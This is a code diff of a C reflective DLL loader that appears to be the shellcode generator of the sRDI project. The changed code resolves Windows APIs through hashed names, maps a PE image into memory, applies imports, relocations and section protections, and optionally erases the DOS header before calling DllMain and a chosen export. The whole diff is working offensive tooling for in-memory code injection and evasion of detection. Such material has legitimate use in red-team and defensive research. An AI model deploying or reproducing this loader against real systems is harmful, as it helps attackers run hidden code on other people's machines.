@@ -3,7 +3,7 @@
 #pragma warning( disable : 4201 ) // Disable warning about 'nameless struct/union'
 
 #include "GetProcAddressWithHash.h"
-#include "64BitHelper.h"
+
 #include <windows.h>
 #include <intrin.h>
 
@@ -25,27 +25,35 @@ typedef FARPROC(WINAPI * GETPROCADDRESS)(HMODULE, LPCSTR);
 typedef LPVOID(WINAPI * VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD);
 typedef VOID(WINAPI * EXITTHREAD)(DWORD);
 typedef DWORD(NTAPI  * NTFLUSHINSTRUCTIONCACHE)(HANDLE, PVOID, ULONG);
+typedef VOID(WINAPI * GETNATIVESYSTEMINFO)(LPSYSTEM_INFO);
+typedef BOOL(WINAPI * VIRTUALPROTECT)(LPVOID, SIZE_T, DWORD, PDWORD);
+typedef int (WINAPI *MESSAGEBOXA)(HWND, LPSTR, LPSTR, UINT);
+
+typedef BOOL(*EXPORTFUNC)(LPVOID, DWORD);
 
 /** NOTE: module hashes are computed using all-caps unicode strings */
 #define KERNEL32DLL_HASH				0x6A4ABC5B
 #define NTDLLDLL_HASH					0x3CFA685D
 
-#define LOADLIBRARYA_HASH				0xEC0E4E8E
-#define GETPROCADDRESS_HASH				0x7C0DFCAA
-#define VIRTUALALLOC_HASH				0x91AFCA54
-#define EXITTHREAD_HSAH					0x60E0CEEF
-#define NTFLUSHINSTRUCTIONCACHE_HASH			0x534C0AB8
-#define RTLEXITUSERTHREAD_HASH				0xFF7F061A // Vista+
-
-#define IMAGE_REL_BASED_ARM_MOV32A		5
-#define IMAGE_REL_BASED_ARM_MOV32T		7
-
-#define ARM_MOV_MASK					(DWORD)(0xFBF08000)
-#define ARM_MOV_MASK2					(DWORD)(0xFBF08F00)
-#define ARM_MOVW						0xF2400000
-#define ARM_MOVT						0xF2C00000
+#define LOADLIBRARYA_HASH				0x726774c
+#define GETPROCADDRESS_HASH				0x7802f749
+#define VIRTUALALLOC_HASH				0xe553a458
+#define EXITTHREAD_HASH					0xa2a1de0
+#define NTFLUSHINSTRUCTIONCACHE_HASH	0x945cb1af
+#define RTLEXITUSERTHREAD_HASH			0xFF7F061A // Vista+
+#define GETNATIVESYSTEMINFO_HASH	    0x959e0033
+#define VIRTUALPROTECT_HASH				0xc38ae110
+#define MESSAGEBOXA_HASH				0x7568345
 
 #define HASH_KEY						13
+
+#define SRDI_CLEARHEADER 0x1
+
+#ifdef _WIN64
+#define HOST_MACHINE IMAGE_FILE_MACHINE_AMD64
+#else
+#define HOST_MACHINE IMAGE_FILE_MACHINE_I386
+#endif
 
 typedef struct _UNICODE_STR
 {
@@ -138,44 +146,15 @@ typedef struct
 } IMAGE_RELOC, *PIMAGE_RELOC;
 #pragma warning(pop)
 
-// Redefine Win32 function signatures. This is necessary because the output
-// of GetProcAddressWithHash is cast as a function pointer. Also, this makes
-// working with these functions a joy in Visual Studio with Intellisense.
-typedef HMODULE (WINAPI *FuncLoadLibraryA) (
-	_In_z_	LPTSTR lpFileName
-);
-
-typedef HANDLE (WINAPI *FuncCreateFile) (
-	_In_     LPCTSTR               lpFileName,
-	_In_     DWORD                 dwDesiredAccess,
-	_In_     DWORD                 dwShareMode,
-	_In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
-	_In_     DWORD                 dwCreationDisposition,
-	_In_     DWORD                 dwFlagsAndAttributes,
-	_In_opt_ HANDLE                hTemplateFile
-);
-
-typedef BOOL (WINAPI *FuncWriteFile)(
-	_In_        HANDLE       hFile,
-	_In_        LPCVOID      lpBuffer,
-	_In_        DWORD        nNumberOfBytesToWrite,
-	_Out_opt_   LPDWORD      lpNumberOfBytesWritten,
-	_Inout_opt_ LPOVERLAPPED lpOverlapped
-);
-
-typedef int (WINAPI *FuncMessageBox)(
-	_In_opt_ HWND    hWnd,
-	_In_opt_ LPSTR lpText,
-	_In_opt_ LPSTR lpCaption,
-	_In_     UINT    uType
-	);
-
-typedef BOOL(*EXPORTFUNC)(LPVOID, DWORD);
+static inline size_t
+AlignValueUp(size_t value, size_t alignment) {
+	return (value + alignment - 1) & ~(alignment - 1);
+}
 
 // Write the logic for the primary payload here
 // Normally, I would call this 'main' but if you call a function 'main', link.exe requires that you link against the CRT
 // Rather, I will pass a linker option of "/ENTRY:ExecutePayload" in order to get around this issue.
-ULONG_PTR ExecutePayload(ULONG_PTR uiLibraryAddress, DWORD dwFunctionHash, LPVOID lpUserData, DWORD nUserdataLen)
+ULONG_PTR ExecutePayload(ULONG_PTR uiLibraryAddress, DWORD dwFunctionHash, LPVOID lpUserData, DWORD nUserdataLen, DWORD flags)
 {
 	#pragma warning( push )
 	#pragma warning( disable : 4055 ) // Ignore cast warnings
@@ -186,6 +165,9 @@ ULONG_PTR ExecutePayload(ULONG_PTR uiLibraryAddress, DWORD dwFunctionHash, LPVOI
 	VIRTUALALLOC pVirtualAlloc = NULL;
 	EXITTHREAD pExitThread = NULL;
 	NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = NULL;
+	GETNATIVESYSTEMINFO pGetNativeSystemInfo = NULL;
+	VIRTUALPROTECT pVirtualProtect = NULL;
+	MESSAGEBOXA pMessageBoxA = NULL;
 
 	PIMAGE_DATA_DIRECTORY directory = NULL;
 	PIMAGE_EXPORT_DIRECTORY exports = NULL;
@@ -195,6 +177,19 @@ ULONG_PTR ExecutePayload(ULONG_PTR uiLibraryAddress, DWORD dwFunctionHash, LPVOI
 	WORD *ordinal = NULL;
 	PCSTR pTempChar;
 	DWORD dwCalculatedFunctionHash;
+	DWORD alignedImageSize;
+
+	SYSTEM_INFO sysInfo;
+
+	DWORD executable;
+	DWORD readable;
+	DWORD writeable;
+	DWORD protect;
+	DWORD oldProtect = 0;
+
+	PIMAGE_SECTION_HEADER section;
+	size_t optionalSectionSize;
+	size_t lastSectionEnd = 0;
 
 	EXPORTFUNC f = NULL;
 
@@ -219,32 +214,91 @@ ULONG_PTR ExecutePayload(ULONG_PTR uiLibraryAddress, DWORD dwFunctionHash, LPVOI
 	// exit code for current thread
 	DWORD dwExitCode = 1;
 
-	pLoadLibraryA = (LOADLIBRARYA)GetProcAddressWithHash(0x726774c);
-	pGetProcAddress = (GETPROCADDRESS)GetProcAddressWithHash(0x7802f749);
-	pVirtualAlloc = (VIRTUALALLOC)GetProcAddressWithHash(0xe553a458);
-	pExitThread = (EXITTHREAD)GetProcAddressWithHash(0xa2a1de0);
-	pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)GetProcAddressWithHash(0x945cb1af);
+	///
+	// STEP 1: Locate all the required functions
+	///
 
-	
-	// STEP 2: load our image into a new permanent location in memory...
+	//pMessageBoxA = (MESSAGEBOXA)GetProcAddressWithHash(MESSAGEBOXA_HASH);
+
+	pLoadLibraryA = (LOADLIBRARYA)GetProcAddressWithHash(LOADLIBRARYA_HASH);
+	pGetProcAddress = (GETPROCADDRESS)GetProcAddressWithHash(GETPROCADDRESS_HASH);
+	pVirtualAlloc = (VIRTUALALLOC)GetProcAddressWithHash(VIRTUALALLOC_HASH);
+	pVirtualProtect = (VIRTUALPROTECT)GetProcAddressWithHash(VIRTUALPROTECT_HASH);
+	pExitThread = (EXITTHREAD)GetProcAddressWithHash(EXITTHREAD_HASH);
+	pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)GetProcAddressWithHash(NTFLUSHINSTRUCTIONCACHE_HASH);
+	pGetNativeSystemInfo = (GETNATIVESYSTEMINFO)GetProcAddressWithHash(GETNATIVESYSTEMINFO_HASH);
+
+	///
+	// STEP 2: load our image into a new permanent location in memory
+	///
 
 	// get the VA of the NT Header for the PE to be loaded
 	uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
 
-	// allocate all the memory for the DLL to be loaded into. we can load at any address because we will  
-	// relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.
-	uiBaseAddress = (ULONG_PTR)pVirtualAlloc(NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+	// Perform sanity checks on the image (Stolen from https://github.com/fancycode/MemoryModule/blob/master/MemoryModule.c)
+
+	if (((PIMAGE_NT_HEADERS)uiHeaderValue)->Signature != IMAGE_NT_SIGNATURE)
+		return 0;
+
+	if (((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.Machine != HOST_MACHINE)
+		return 0;
+
+	if (((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SectionAlignment & 1)
+		return 0;
+
+
+	// Align the image to the page size (Stolen from https://github.com/fancycode/MemoryModule/blob/master/MemoryModule.c)
+
+	section = IMAGE_FIRST_SECTION(((PIMAGE_NT_HEADERS)uiHeaderValue));
+	optionalSectionSize = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SectionAlignment;
+	for (idx = 0; idx < ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections; idx++, section++) {
+		size_t endOfSection;
+		if (section->SizeOfRawData == 0) {
+			// Section without data in the DLL
+			endOfSection = section->VirtualAddress + optionalSectionSize;
+		}
+		else {
+			endOfSection = section->VirtualAddress + section->SizeOfRawData;
+		}
+
+		if (endOfSection > lastSectionEnd) {
+			lastSectionEnd = endOfSection;
+		}
+	}
+
+	pGetNativeSystemInfo(&sysInfo);
+	alignedImageSize = AlignValueUp(((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, sysInfo.dwPageSize);
+	if (alignedImageSize != AlignValueUp(lastSectionEnd, sysInfo.dwPageSize))
+		return 0;
+
+	// allocate all the memory for the DLL to be loaded into. We are going to relocate anyways.
+	// Also zeros all memory and marks it as READ and WRITE.
+	uiBaseAddress = (ULONG_PTR)pVirtualAlloc(NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 
 	// we must now copy over the headers
 	uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
 	uiValueB = uiLibraryAddress;
 	uiValueC = uiBaseAddress;
-	
-	while (uiValueA--)
-		*(BYTE *)uiValueC++ = *(BYTE *)uiValueB++;
+	uiValueD = 0;
+	uiValueE = FIELD_OFFSET(IMAGE_DOS_HEADER, e_lfanew);
 
-	// STEP 3: load in all of our sections...
+	while (uiValueA--) {
+		if ((flags & SRDI_CLEARHEADER) && uiValueD < (uiHeaderValue - uiLibraryAddress) && (uiValueD < uiValueE || uiValueD > (uiValueE + sizeof(WORD)))) {
+			// Blow away everything before the NT_HEADERS. Leave e_lfanew;
+			*(BYTE *)uiValueC++ = '\0';
+			uiValueB++;
+		}
+		else
+			*(BYTE *)uiValueC++ = *(BYTE *)uiValueB++;
+
+		uiValueD++;
+	}
 	
+	///
+	// STEP 3: load in all of our sections
+	///
+
 	// uiValueA = the VA of the first section
 	uiValueA = ((ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader);
 
@@ -268,7 +322,9 @@ ULONG_PTR ExecutePayload(ULONG_PTR uiLibraryAddress, DWORD dwFunctionHash, LPVOI
 		uiValueA += sizeof(IMAGE_SECTION_HEADER);
 	}
 	
-	// STEP 4: process our images import table...
+	///
+	// STEP 4: process our images import table
+	///
 
 	// uiValueB = the address of the import directory
 	uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
@@ -335,8 +391,10 @@ ULONG_PTR ExecutePayload(ULONG_PTR uiLibraryAddress, DWORD dwFunctionHash, LPVOI
 		uiValueC += sizeof(IMAGE_IMPORT_DESCRIPTOR);
 	}
 	
-	// STEP 5: process all of our images relocations...
-	
+	///
+	// STEP 5: process all of our images relocations
+	///
+
 	// calculate the base address delta and perform relocations (even if we load at desired image base)
 	uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;
 
@@ -385,8 +443,59 @@ ULONG_PTR ExecutePayload(ULONG_PTR uiLibraryAddress, DWORD dwFunctionHash, LPVOI
 		}
 	}
 
-	// STEP 6: call our images entry point
-	
+	///
+	// STEP 6: Finalize our sections. Set memory protections.
+	///
+
+	uiValueA = ((ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader);
+
+	// itterate through all sections, loading them into memory.
+	uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;
+	while (uiValueE--)
+	{
+		if (((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData > 0) {
+
+			// determine protection flags based on characteristics
+			executable = (((PIMAGE_SECTION_HEADER)uiValueA)->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
+			readable = (((PIMAGE_SECTION_HEADER)uiValueA)->Characteristics & IMAGE_SCN_MEM_READ) != 0;
+			writeable = (((PIMAGE_SECTION_HEADER)uiValueA)->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
+
+			if (!executable && !readable && !writeable)
+				protect = PAGE_NOACCESS;
+			else if (!executable && !readable && writeable)
+				protect = PAGE_WRITECOPY;
+			else if (!executable && readable && !writeable)
+				protect = PAGE_READONLY;
+			else if (!executable && readable && writeable)
+				protect = PAGE_READWRITE;
+			else if (executable && !readable && !writeable)
+				protect = PAGE_EXECUTE;
+			else if (executable && !readable && writeable)
+				protect = PAGE_EXECUTE_WRITECOPY;
+			else if (executable && readable && !writeable)
+				protect = PAGE_EXECUTE_READ;
+			else if (executable && readable && writeable)
+				protect = PAGE_EXECUTE_READWRITE;
+
+			if (((PIMAGE_SECTION_HEADER)uiValueA)->Characteristics & IMAGE_SCN_MEM_NOT_CACHED) {
+				protect |= PAGE_NOCACHE;
+			}
+
+			// change memory access flags
+			if (!pVirtualProtect((LPVOID)(uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress),
+								((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData,
+								protect, &oldProtect))
+				return 0;
+		}
+
+		// get the VA of the next section
+		uiValueA += sizeof(IMAGE_SECTION_HEADER);
+	}
+
+	///
+	// STEP 7: call our images entry point
+	///
+
 	// uiValueA = the VA of our newly loaded DLL/EXE's entry point
 	uiValueA = (uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint);
 
@@ -398,6 +507,10 @@ ULONG_PTR ExecutePayload(ULONG_PTR uiLibraryAddress, DWORD dwFunctionHash, LPVOI
 
 	((DLLMAIN)uiValueA)((HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, (LPVOID)1);
 
+
+	///
+	// STEP 8: call our exported function
+	///
 	if (dwFunctionHash) {
 		
 		do
